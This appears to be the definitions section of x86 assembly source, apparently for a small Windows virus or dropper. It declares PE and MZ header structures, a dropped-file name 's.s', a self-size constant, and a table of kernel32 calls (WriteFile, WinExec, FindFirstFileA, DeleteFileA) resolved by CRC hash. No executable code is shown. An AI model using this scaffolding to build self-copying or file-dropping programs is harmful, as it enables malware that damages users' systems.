   CREATE_ALWAYS           equ     2
   OPEN_EXISTING           equ     3

   GENERIC_WRITE           equ     40000000h
   GENERIC_READ            equ     80000000h

   FILE_SHARE_READ         equ     1

   FILE_CURRENT            equ     1
   FILE_END                equ     2

   GMEM_ZEROINIT           equ     40h

   SW_SHOWDEFAULT          equ     10

   DROP_NAME               equ     db "s.s"
   SELF_SIZE               equ     700h
   PIF_SIZE                equ     246h

   FILETIME        struct
           dwLowDateTime   dd      ?
           dwHighDateTime  dd      ?
   FILETIME        ends

   WIN32_FIND_DATAA struct
           dwFileAttributes        dd              ?
           ftCreationTime          FILETIME        <?>
           ftLastAccessTime        FILETIME        <?>
           ftLastWriteTime         FILETIME        <?>
           dwFileSizeHigh          dd              ?
           dwFileSizeLow           dd              ?
           dwReserved0             dd              ?
           dwReserved1             dd              ?
           cFileName               db              260 dup (?)
           cAlternateFileName      db              14 dup (?)
   WIN32_FIND_DATAA ends

   coffhdr         struct
           pemachine       dw      ?               ;04
           pesectcount     dw      ?               ;06
           petimedate      dd      ?               ;08
           pesymbrva       dd      ?               ;0C
           pesymbcount     dd      ?               ;10
           peopthdrsize    dw      ?               ;14
           peflags         dw      ?               ;16
   coffhdr         ends

   pedir           struct
           dirrva          dd      ?
           dirsize         dd      ?
   pedir           ends

   pehdr           struct
           pesig           dd      ?               ;00
           pecoff          coffhdr <?>
           pemagic         dw      ?               ;18
           pemajorlink     db      ?               ;1A
           peminorlink     db      ?               ;1B
           pecodesize      dd      ?               ;1C
           peidatasize     dd      ?               ;20
           peudatasize     dd      ?               ;24
           peentrypoint    dd      ?               ;28
           pecodebase      dd      ?               ;2C
           pedatabase      dd      ?               ;30
           peimagebase     dd      ?               ;34
           pesectalign     dd      ?               ;38
           pefilealign     dd      ?               ;3C
           pemajoros       dw      ?               ;40
           peminoros       dw      ?               ;42
           pemajorimage    dw      ?               ;44
           peminorimage    dw      ?               ;46
           pemajorsubsys   dw      ?               ;48
           peminorsubsys   dw      ?               ;4A
           pereserved      dd      ?               ;4C
           peimagesize     dd      ?               ;50
           pehdrsize       dd      ?               ;54
           pechksum        dd      ?               ;58
           pesubsys        dw      ?               ;5C
           pedllflags      dw      ?               ;5E
           pestackmax      dd      ?               ;60
           pestacksize     dd      ?               ;64
           peheapmax       dd      ?               ;68
           peheapsize      dd      ?               ;6C
           peldrflags      dd      ?               ;70
           pervacount      dd      ?               ;74
           peexport        pedir   <?>             ;78
           peimport        pedir   <?>             ;80
           persrc          pedir   <?>             ;88
           peexcpt         pedir   <?>             ;90
           pesecurity      pedir   <?>             ;98
           pereloc         pedir   <?>             ;A0
           pedebug         pedir   <?>             ;A8
           pearch          pedir   <?>             ;B0
           peglobal        pedir   <?>             ;B8
           petls           pedir   <?>             ;C0
           peconfig        pedir   <?>             ;C8
           pebound         pedir   <?>             ;D0
           peiat           pedir   <?>             ;D8
           pedelay         pedir   <?>             ;E0
           pecom           pedir   <?>             ;E8
           persrv          pedir   <?>             ;F0
   pehdr           ends

   peexp           struct
           expflags        dd      ?
           expdatetime     dd      ?
           expmajorver     dw      ?
           expminorver     dw      ?
           expdllrva       dd      ?
           expordbase      dd      ?
           expadrcount     dd      ?
           expnamecount    dd      ?
           expadrrva       dd      ?
           expnamerva      dd      ?
           expordrva       dd      ?
   peexp           ends

   mzhdr           struct
           mzsig           dw      ?               ;00
           mzpagemod       dw      ?               ;02
           mzpagediv       dw      ?               ;04
           mzrelocs        dw      ?               ;06
           mzhdrsize       dw      ?               ;08
           mzminalloc      dw      ?               ;0A
           mzmaxalloc      dw      ?               ;0C
           mzss            dw      ?               ;0E
           mzsp            dw      ?               ;10
           mzchksum        dw      ?               ;12
           mzip            dw      ?               ;14
           mzcs            dw      ?               ;16
           mzreloff        dw      ?               ;18
           mzfiller        db      22h dup (?)     ;1A
           mzlfanew        dd      ?               ;3C
   mzhdr   ends

   krncrcstk       struct
           kdummy                  dd      ?
           klstrlenA               dd      ?
           kWriteFile              dd      ?
           kWinExec                dd      ?
           kSetFilePointer         dd      ?
           kReadFile               dd      ?
           kGlobalAlloc            dd      ?
           kGetTickCount           dd      ?
           kGetFileSize            dd      ?
           kFindNextFileA          dd      ?
           kFindFirstFileA         dd      ?
           kExitProcess            dd      ?
           kDeleteFileA            dd      ?
           kCreateFileA            dd      ?
           kCloseHandle            dd      ?
   krncrcstk       ends
   krncrc_count    equ     (size krncrcstk - 4) shr 2
